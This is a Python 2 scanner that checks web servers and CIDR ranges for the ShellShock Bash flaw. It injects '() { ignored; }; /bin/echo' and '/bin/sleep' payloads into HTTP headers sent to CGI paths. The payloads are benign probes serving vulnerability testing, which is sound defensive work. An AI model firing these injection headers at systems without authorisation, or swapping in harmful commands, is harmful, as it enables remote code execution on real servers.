#!/usr/bin/python

import requests
import argparse
import sys
import socket
import math
import string
import random
import re

# Copyright (c) 2007 Brandon Sterne
# Licensed under the MIT license.
# http://brandon.sternefamily.net/files/mit-license.txt
# CIDR Block Converter - 2007

# convert an IP address from its dotted-quad format to its
# 32 binary digit representation
def ip2bin(ip):
    b = ""
    inQuads = ip.split(".")
    outQuads = 4
    for q in inQuads:
        if q != "":
            b += dec2bin(int(q),8)
            outQuads -= 1
    while outQuads > 0:
        b += "00000000"
        outQuads -= 1
    return b

# convert a decimal number to binary representation
# if d is specified, left-pad the binary number with 0s to that length
def dec2bin(n,d=None):
    s = ""
    while n>0:
        if n&1:
            s = "1"+s
        else:
            s = "0"+s
        n >>= 1
    if d is not None:
        while len(s)<d:
            s = "0"+s
    if s == "": s = "0"
    return s

# convert a binary string into an IP address
def bin2ip(b):
    ip = ""
    for i in range(0,len(b),8):
        ip += str(int(b[i:i+8],2))+"."
    return ip[:-1]

# return a list of IP addresses based on the CIDR block specified
def getCIDR(c):
    ips = []
    parts = c.split("/")
    baseIP = ip2bin(parts[0])
    subnet = int(parts[1])
    # Python string-slicing weirdness:
    # "myString"[:-1] -> "myStrin" but "myString"[:0] -> ""
    # if a subnet of 32 was specified simply print the single IP
    if subnet == 32:
        ips.append(bin2ip(baseIP))
        return ips
    # for any other size subnet, print a list of IP addresses by concatenating
    # the prefix with each of the suffixes in the subnet
    else:
        ipPrefix = baseIP[:-(32-subnet)]
        for i in range(2**(32-subnet)):
            ips.append(bin2ip(ipPrefix+dec2bin(i, (32-subnet))))
        return ips

# input validation routine for the CIDR block specified
def validateCIDRBlock(b):
    # appropriate format for CIDR block ($prefix/$subnet)
    p = re.compile("^([0-9]{1,3}\.){0,3}[0-9]{1,3}(/[0-9]{1,2}){1}$")
    if not p.match(b):
        #print "Error: Invalid CIDR format!"
        return False
    # extract prefix and subnet size
    prefix, subnet = b.split("/")
    # each quad has an appropriate value (1-255)
    quads = prefix.split(".")
    for q in quads:
        if (int(q) < 0) or (int(q) > 255):
            #print "Error: quad "+str(q)+" wrong size."
            return False
    # subnet is an appropriate value (1-32)
    if (int(subnet) < 1) or (int(subnet) > 32):
        #print "Error: subnet "+str(subnet)+" wrong size."
        return False
    # passed all checks -> return True
    return True

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('-r', '--resources', type=str, help='The path to a file containing a newline separated list of resources to test. (default: /, /cgi-bin, /cgi-bin/status, /cgi, /cgi/status')
    parser.add_argument('-H', '--headers', type=str, help='The path to a file containing a newline separated list of headers to insert payloads into (default: User-Agent, Cookie, Referer, Host)')
    parser.add_argument('-p', '--ports', type=str, default='80,ssl:443', help='Comma separated list of ports to check. Prefix port with \'ssl:\' to connect over SSL/TLS (default: 80,ssl:443)')
    parser.add_argument('-t', '--time', type=int, help='Number of seconds to give as a parameter to /bin/sleep when attempting exploit (default: based on base loading time)')
    parser.add_argument('-f', '--fetches', type=int, default=3, help='Number of times a resource should be fetched in order to calculate its base load time.')
    parser.add_argument('-v', '--verbose', action='store_true', default=False, help='Verbose output.')
    parser.add_argument('targets', metavar='target', nargs='+', help='A target to scan.')
    args = parser.parse_args()

    verbose = args.verbose

    ports = args.ports.split(',')
    for port in ports:
        if port.startswith('ssl:'):
            port = port.split('ssl:')[1]
        if not port.isdigit():
            print >> sys.stderr, 'Port \'' + port + '\' is not an integer.'
            sys.stderr.flush()
            sys.exit(1)
        port = int(port)
        if port <= 0 or port > 65535:
            print >> sys.stderr, 'Port \'' + str(port) + '\' is not a valid port number.'
            sys.stderr.flush()
            sys.exit(1)

    fetches = args.fetches
    if fetches <= 0:
        print >> sys.stderr, 'Cannot fetch 0 or fewer times.'
        sys.stderr.flush()
        sys.exit(1)

    if args.resources:
        try:
            with open(args.resources) as f:
                resources = f.readlines()
                resources = [x.strip('\n') for x in resources]
        except:
            print >> sys.stderr, 'File \'' + args.resources + '\' did not exist or could not be read.'
            sys.stderr.flush()
            sys.exit(1)
    else:
        resources = ['/', '/cgi-bin', '/cgi-bin/status', '/cgi', '/cgi/status']

    if args.headers:
        try:
            with open(args.headers) as f:
                headers = f.readlines()
                headers = [x.strip('\n') for x in headers]
        except:
            print >> sys.stderr, 'File \'' + args.headers + '\' did not exist or could not be read.'
            sys.stderr.flush()
            sys.exit(1)
    else:
        headers = ['User-Agent', 'Cookie', 'Referer', 'Host']
        
    targets = []
    
    for t in args.targets:
        for t2 in t.split(','):
            t2 = t2.strip()
            if validateCIDRBlock(t2):
                for t3 in getCIDR(t2):
                    if t3 not in targets:
                        targets.append(t3)
            else:
                if t2 and t2 not in targets:
                    targets.append(t2)

    for target in targets:
        try:
            ip = socket.gethostbyname(target)
        except socket.gaierror as e:
            print '[INFO] Testing target: ' + target
            sys.stdout.flush()
            print >> sys.stderr, '\033[93m[ERROR] Could not resolve an IP address for the given target.\033[0m\n'
            sys.stderr.flush()
            continue
        
        vulnerable = False
        for port in ports:
        
            ssl = False
            ssl_text = ''
            if port.startswith('ssl:'):
                ssl = True
                port = port.split('ssl:')[1]
                ssl_text = ' (SSL)'
            
            if ip == target:
                print '[INFO] Testing target: ' + target + ':' + port + ssl_text
            else:
                print '[INFO] Testing target: ' + target + ':' + port + ' (' + str(ip) + ':' + port + ')' + ssl_text
            sys.stdout.flush()

            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            result = sock.connect_ex((target, int(port)))
            if result != 0:
                print >> sys.stderr, '\033[93m[ERROR] Port ' + str(port) + ' is closed. Skipping tests on this port.\033[0m'
                sys.stderr.flush()
                continue
                    
            for resource in resources:
                schema = 'http'
                if ssl:
                    schema = 'https'
                targetString = schema + '://' + target + ':' + port + resource

                randomString = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(32))

                for header in headers:
                    payload_headers = {header:'() { ignored; }; /bin/echo; /bin/echo ' + randomString + ';'}
                    if verbose:
                        print('[INFO] Attempting to trigger vulnerability on ' + targetString + ' with ECHO payload in ' + header)
                    try:
                        r = requests.get(targetString, headers=payload_headers, verify=False)
                    except:
                        continue
                    for rheader in r.headers:
                        if randomString in r.headers[rheader]:
                            vulnerable = True
                            break

                    if vulnerable:
                        break
                    else:
                        if randomString in r.text:
                            vulnerable = True
                            break

                if vulnerable:
                    print '\033[91m\033[1m[FAIL] Random payload string found in response. ' + targetString + ' with ECHO payload in ' + header + ' is vulnerable to ShellShock!\033[0m'
                    break                

                if fetches == 1:
                    num_fetches = ' once'
                else:
                    num_fetches = ' ' + str(fetches) + ' times'

                if verbose:
                    print('[INFO] Fetching ' + targetString + num_fetches + ' to establish base load time.')

                base_load_time = 0.0
                for i in range(fetches):
                    try:
                        r = requests.get(targetString, verify=False)
                    except:
                        continue
                    base_load_time += r.elapsed.total_seconds()
                base_load_time = base_load_time / fetches

                if args.time:
                    time = args.time
                else:
                    time = math.ceil(base_load_time * 2)

                if verbose:
                    print('[INFO] Base load time for ' + targetString + ' is ' + str(base_load_time) + 's.')

                for header in headers:
                    payload_headers = {header:'() { ignored; }; /bin/sleep ' + str(time) + ';'}
                    
                    if verbose:
                        print('[INFO] Attempting to trigger vulnerability on ' + targetString + ' with SLEEP payload in ' + header)
 
                    try:
                        r = requests.get(targetString, headers=payload_headers, verify=False)
                    except:
                        continue
                    page_load_time = r.elapsed.total_seconds()                  
                    if page_load_time >= time:
                        print '\033[91m\033[1m[FAIL] Page took ' + str(page_load_time) + 's to load (base load time: ' + str(base_load_time) + 's). ' + targetString + ' with SLEEP payload in ' + header + ' is vulnerable to ShellShock!\033[0m'
                        vulnerable = True
                        break

                if vulnerable:
                    break
            if vulnerable:
                break
        if not vulnerable:
            print '\033[1m[PASS] ' + target + ' does not appear to be vulnerable to ShellShock!\033[0m\n'
        sys.stdout.flush()

if __name__ == '__main__':
    main()

